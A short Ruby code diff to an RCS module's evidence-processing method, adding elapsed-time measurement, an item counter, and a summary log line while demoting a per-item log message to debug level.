@@ -99,6 +99,7 @@ module RCS
       end
 
       def process(grid_ev)
+        start_time = Time.now
         raw_id = grid_ev['_id']
 
         raise MissingAgentError.new("Unable to process evidence #{raw_id}, agent #{@agent_uid} is missing") unless agent?
@@ -107,10 +108,16 @@ module RCS
 
         return if list.blank?
 
+        ev_type = nil
+        ev_processed_count = 0
+
         list.each do |ev|
           next if ev.empty?
 
-          trace(:info, "[#{@agent_uid}] Processing #{ev[:type].upcase} evidence for agent: #{agent.name}")
+          ev_processed_count += 1
+          ev_type ||= ev[:type]
+
+          trace(:debug, "[#{@agent_uid}] Processing #{ev[:type].upcase} evidence for agent: #{agent.name}")
 
           # store agent instance in evidence (used when storing into db)
           ev[:instance] ||= @instance
@@ -136,6 +143,8 @@ module RCS
             save_evidence(evidence) if evidence
           end
         end
+
+        trace(:info, "[#{@agent_uid}] Processed #{ev_processed_count} #{ev_type.upcase} evidence(s) (#{decoded_data.size} bytes) for agent #{agent.name} in #{Time.now - start_time} sec") if ev_processed_count > 0
       rescue Mongo::ConnectionFailure => e
         trace :error, "[#{@agent_uid}] cannot connect to database, retrying in 5 seconds..."
         sleep(5)
